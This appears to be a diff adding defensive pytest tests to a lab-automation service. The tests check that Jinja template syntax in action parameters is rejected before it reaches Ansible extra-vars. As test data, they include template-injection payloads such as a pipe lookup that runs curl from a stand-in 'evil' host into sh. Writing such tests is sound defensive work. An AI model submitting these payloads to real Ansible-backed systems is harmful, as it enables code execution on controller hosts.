@@ -208,3 +208,101 @@ async def test_other_unknown_keys_are_still_rejected(superuser_client, db, stub_
         },
     )
     assert resp.status_code == 422
+
+
+class TestTemplateDelimitersAreRefused:
+    """SEC-20: action parameters become Ansible extra-vars.
+
+    Ansible does not mark extra-vars ``!unsafe``, so the moment a playbook
+    templates one — a ``msg:``, a ``when:``, a ``template:`` src — the
+    value is evaluated **on the Ansible controller**, which is the LabDog
+    host itself, as the labdog user. Not on the target. So
+    ``{{ lookup('pipe', 'curl … | sh') }}`` in an ordinary run body was
+    code execution on LabDog, reachable by any authenticated account.
+    """
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "{{ lookup('pipe', 'id') }}",
+            "1.2.3 {{ lookup('pipe','curl http://evil/x | sh') }}",
+            "{% for x in range(10) %}{% endfor %}",
+            "{# comment #}",
+            # Splices into the middle of an existing expression from the
+            # other side, so the opening delimiter is in the template.
+            "1.2.3 }} evil {{",
+        ],
+    )
+    async def test_jinja_in_a_string_parameter_is_422(
+        self, superuser_client, db, stub_celery_dispatch, payload
+    ):
+        host = await create_host(db)
+        resp = await superuser_client.post(
+            "/api/actions/runs",
+            json={
+                "action_key": "linux-os-upgrade",
+                "host_id": host.id,
+                "parameters": {"current_version": payload, "next_version": "13"},
+            },
+        )
+        assert resp.status_code == 422, resp.text
+        assert "template delimiters" in resp.text
+
+    async def test_an_ordinary_version_string_still_runs(
+        self, superuser_client, db, stub_celery_dispatch
+    ):
+        """The regression half — braces are not common in these values, but
+        refusing every string would be its own outage."""
+        host = await create_host(db)
+        resp = await superuser_client.post(
+            "/api/actions/runs",
+            json={
+                "action_key": "linux-os-upgrade",
+                "host_id": host.id,
+                "parameters": {"current_version": "12", "next_version": "13"},
+            },
+        )
+        assert resp.status_code not in (400, 422), resp.text
+
+
+class TestExtraVarsAreRecheckedBeforeAnsible:
+    """The task-layer gate, which does not trust the API gate.
+
+    Parameters can reach a run without passing ``build_param_model``: a row
+    written before this validation existed, a ``choice`` whose permitted
+    values come from a pack manifest rather than from LabDog, or a future
+    caller assembling a run directly.
+    """
+
+    def test_a_clean_payload_passes_through_unchanged(self):
+        from app.actions.extra_vars import sanitize_extra_vars
+
+        params = {"version": "13", "reboot": True, "count": 3}
+        assert sanitize_extra_vars(params) is params
+
+    def test_none_and_empty_are_allowed(self):
+        from app.actions.extra_vars import sanitize_extra_vars
+
+        assert sanitize_extra_vars(None) is None
+        assert sanitize_extra_vars({}) == {}
+
+    @pytest.mark.parametrize(
+        "params",
+        [
+            {"v": "{{ lookup('pipe','id') }}"},
+            {"outer": {"inner": "{{ 7*7 }}"}},
+            {"items": ["ok", "{% import os %}"]},
+            {"items": [{"deep": "{{ x }}"}]},
+        ],
+    )
+    def test_template_syntax_anywhere_in_the_structure_raises(self, params):
+        from app.actions.extra_vars import sanitize_extra_vars
+
+        with pytest.raises(ValueError, match="template delimiters"):
+            sanitize_extra_vars(params)
+
+    def test_the_error_names_the_offending_key_path(self):
+        from app.actions.extra_vars import sanitize_extra_vars
+
+        with pytest.raises(ValueError, match=r"outer\.inner"):
+            sanitize_extra_vars({"outer": {"inner": "{{ x }}"}})
